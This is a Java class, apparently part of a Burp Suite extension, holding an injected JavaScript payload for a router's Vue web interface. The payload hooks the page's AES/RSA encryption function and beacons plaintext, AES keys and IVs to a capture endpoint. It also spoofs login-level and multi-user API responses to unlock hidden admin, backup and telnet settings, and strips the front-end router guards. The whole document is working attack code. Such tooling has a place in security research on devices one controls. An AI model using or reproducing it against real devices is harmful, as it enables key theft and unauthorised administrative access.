class HookPayload {
    static final String HOOK_JS =
            "(() => {\n" +
            "  const MAX_PREVIEW = 256;\n" +
            "\n" +
            "  function sendToBurp(payload) {\n" +
            "    const json = JSON.stringify(payload);\n" +
            "    const blob = new Blob([json], { type: 'application/json' });\n" +
            "    if (navigator.sendBeacon && navigator.sendBeacon('/__capture__', blob)) return;\n" +
            "    try {\n" +
            "      fetch('/__capture__', { method: 'POST', mode: 'no-cors', headers: { 'Content-Type': 'application/json' }, body: json }).catch(() => {});\n" +
            "      return;\n" +
            "    } catch (_) {}\n" +
            "    try {\n" +
            "      const img = new Image();\n" +
            "      img.src = '/__capture__?d=' + encodeURIComponent(btoa(unescape(encodeURIComponent(json))));\n" +
            "    } catch (_) {}\n" +
            "  }\n" +
            "\n" +
            "  function preview(v) {\n" +
            "    if (typeof v === 'string') return v.slice(0, MAX_PREVIEW);\n" +
            "    try { return JSON.stringify(v).slice(0, MAX_PREVIEW); } catch { return String(v).slice(0, MAX_PREVIEW); }\n" +
            "  }\n" +
            "\n" +
            "  function hookComponent(comp) {\n" +
            "    if (!comp || typeof comp.AesRsaEncrypt !== 'function' || comp.__aesHooked__) return false;\n" +
            "    comp.__aesHooked__ = true;\n" +
            "    const _orig = comp.AesRsaEncrypt;\n" +
            "    comp.AesRsaEncrypt = function(outObj, plainText, aesKeyB64, ivB64, wrapKey) {\n" +
            "      const t0 = (self.performance && performance.now()) || Date.now();\n" +
            "      const ret = _orig.apply(this, arguments);\n" +
            "      const report = {\n" +
            "        ts: new Date().toISOString(),\n" +
            "        url: location.href,\n" +
            "        wrapKey: !!wrapKey,\n" +
            "        ivB64,\n" +
            "        aesKeyB64,\n" +
            "        plaintextLen: (typeof plainText === 'string' ? plainText.length : 0),\n" +
            "        plaintextPreview: preview(plainText),\n" +
            "        plaintext: (function(p){ try { return (typeof p === 'string') ? p : JSON.stringify(p); } catch(e) { return String(p); } })(plainText),\n" +
            "        out: {\n" +
            "          contentLen: (outObj && outObj.content && outObj.content.length) || 0,\n" +
            "          contentPreview: outObj && outObj.content ? outObj.content.slice(0, 64) : null,\n" +
            "          keyB64: outObj && outObj.key || null,\n" +
            "          ivB64: outObj && outObj.iv || ivB64\n" +
            "        },\n" +
            "        stack: (new Error()).stack,\n" +
            "        dt_ms: (((self.performance && performance.now()) || Date.now()) - t0)\n" +
            "      };\n" +
            "      try { sendToBurp(report); } catch (_) {}\n" +
            "      return ret;\n" +
            "    };\n" +
            "    console.log('[hook] AesRsaEncrypt hooked on', comp);\n" +
            "    return true;\n" +
            "  }\n" +
            "\n" +
            "  function scanAndHook() {\n" +
            "    for (const el of document.querySelectorAll('*')) {\n" +
            "      const vm = el.__vue__;\n" +
            "      if (vm && typeof vm.AesRsaEncrypt === 'function') {\n" +
            "        if (hookComponent(vm)) return true;\n" +
            "      }\n" +
            "    }\n" +
            "    for (const el of document.querySelectorAll('*')) {\n" +
            "      const inst = el.__vueParentComponent;\n" +
            "      const ctx = inst && inst.ctx;\n" +
            "      if (ctx && typeof ctx.AesRsaEncrypt === 'function') {\n" +
            "        if (hookComponent(ctx)) return true;\n" +
            "      }\n" +
            "    }\n" +
            "    return false;\n" +
            "  }\n" +
            "\n" +
            "  // Try now, then poll until mounted\n" +
            "  if (!scanAndHook()) {\n" +
            "    const timer = setInterval(() => {\n" +
            "      if (scanAndHook()) clearInterval(timer);\n" +
            "    }, 500);\n" +
            "  }\n" +
            "\n" +
            "  // === DEBUG MODE HOOK ===\n" +
            "  const root = document.getElementById('app')?.__vue__?.$root;\n" +
            "  if (!root) { console.warn('No Vue root found at #app'); return; }\n" +
            "  const store  = root.$store;\n" +
            "  const router = root.$router;\n" +
            "\n" +
            "  const VueProto    = root.__proto__.constructor.prototype;\n" +
            "  const originalReq = VueProto.httpReqSendAndRecv;\n" +
            "\n" +
            "  const forceAllVisible = (g) => Object.assign(g, {\n" +
            "    MULTI_USER_Customization: false,\n" +
            "    hideMGMT: false,\n" +
            "    hideTrustDomain: false,\n" +
            "    hideMGMTboth: false,\n" +
            "    hideTrustDomainboth: false,\n" +
            "    hideBackupboth: false,\n" +
            "    HideHttp: false,\n" +
            "    hideFTP: false,\n" +
            "    hideTELNET: false,\n" +
            "    ABPY_GUI_Customization: false,\n" +
            "    ABQA_GUI_Customization: false,\n" +
            "    ZYXEL_SFU_MODE: false,\n" +
            "    CTB_GUI_Customization: false,\n" +
            "    ABUU_GUI_Customization: false,\n" +
            "    ACEC_GUI_Customization: false,\n" +
            "    ACGK_HGW_STYLE_GUI: false,\n" +
            "    abzq_customization: false,\n" +
            "    CUSTOMIZATION_HYP_R_PT_C: false,\n" +
            "    HTTP_Redirect_HTTPS: true,\n" +
            "    RemoteSeparateLanWlanPrivilege: true,\n" +
            "    showEasyMeshLabel: true,\n" +
            "    showDHCPOpt42: true\n" +
            "  });\n" +
            "\n" +
            "  const spoof = {\n" +
            "    \"/cgi-bin/MULTI_USER_LIST_Get\": {\n" +
            "      Object: [{\n" +
            "        TTNETMultiUser: 0,\n" +
            "        curloginLevel: 2,\n" +
            "        MGMTVisibilityLevel: 1,\n" +
            "        BackupVisibilityLevel: 1,\n" +
            "        TimeVisibilityLevel: 1,\n" +
            "        BackupLock: 0,\n" +
            "        BackupLimitation: 0,\n" +
            "        enblMGMTcancelsubmit: true,\n" +
            "        enblBackup: true,\n" +
            "        enblBackupfilename: true,\n" +
            "        enblBackupupload: true,\n" +
            "        enblresetbtn: true,\n" +
            "        enblLanid: true,\n" +
            "        enblwlanid: true,\n" +
            "        enblwanid: true,\n" +
            "        enblport: true,\n" +
            "        enbllocallan: true,\n" +
            "        enbltelnetLanid: true,\n" +
            "        enbltelnetwlanid: true,\n" +
            "        enbltelnetwanid: true,\n" +
            "        enbltelnetport: true\n" +
            "      }]\n" +
            "    },\n" +
            "    \"/cgi-bin/loginAccountLevel\": [{ level: \"high\" }]\n" +
            "  };\n" +
            "\n" +
            "  function enableDebug() {\n" +
            "  forceAllVisible(store.state.guiFlag);\n" +
            "  VueProto.httpReqSendAndRecv = function (opts = {}) {\n" +
            "    const hit = spoof[opts.url];\n" +
            "    if (hit) {\n" +
            "      if (typeof opts.fnSuccess === 'function') setTimeout(() => opts.fnSuccess(hit), 0);\n" +
            "      if (typeof opts.fnComplete === 'function') setTimeout(() => opts.fnComplete(hit), 0);\n" +
            "      return Promise.resolve(hit);\n" +
            "    }\n" +
            "    return originalReq.call(this, opts);\n" +
            "  };\n" +
            "  root.$forceUpdate();\n" +
            "}\n" +
            "\n" +
            "function disableDebug() {\n" +
            "  VueProto.httpReqSendAndRecv = originalReq;\n" +
            "  root.$forceUpdate();\n" +
            "}\n" +
            "\n" +
            "  window.hack = { router, store, enableDebug, disableDebug };\n" +
            "  console.log('hack ready. Call hack.enableDebug() / hack.disableDebug().', { router, store });\n" +
            "\n" +
            "// Nuking guards\n" +
            "const r = window.hack.router\n" +
            "r.beforeHooks.length = 0\n" +
            "r.resolveHooks.length = 0\n" +
            "r.afterHooks.length = 0\n" +
            "\n" +
            "})();\n" +
            "console.log(\"Store and router are available by window.hack.store and window.hack.router\")\n" +
            "console.log(\"Use window.hack.router.push({ path: '/GPON', query: { debug: 1 } }) to change path. Guards are disabled.\");";
}